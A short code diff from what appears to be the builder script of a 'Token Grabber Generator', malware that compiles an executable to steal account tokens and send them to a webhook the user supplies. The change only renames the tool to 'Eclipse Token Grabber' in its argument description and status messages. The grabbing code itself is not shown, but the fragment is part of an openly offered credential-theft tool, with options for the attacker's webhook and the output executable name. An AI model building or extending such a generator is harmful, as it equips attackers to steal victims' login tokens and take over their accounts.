@@ -58,7 +58,7 @@ class Builder:
         subprocess.call(compile_command)
 
 def getArgs():
-    parser = argparse.ArgumentParser(description='Token Grabber Generator')
+    parser = argparse.ArgumentParser(description='Eclipse Token Grabber Generator')
     parser.add_argument('-w', '--webhook', help='Add your webhook', default='')
     parser.add_argument('-o', '--outfile', help='Name your Executable', default='')    
     return parser.parse_args()
@@ -96,8 +96,8 @@ else:
     ''')
 
     try:
-        print("\n[+] Generating Token Grabber, please wait...")
+        print("\n[+] Generating Eclipse Token Grabber, please wait...")
         Builder(webhook, out_file, OS).build()
-        print("\n\n[+] Succesfully Generated Token Grabber\n\n[+] You can find it inside the dist directory")
+        print("\n\n[+] Succesfully Generated Eclipse Token Grabber\n\n[+] You can find it inside the dist directory")
     except Exception as e:
         print(f"\n[-] An ERROR has occurred:\n{e}")
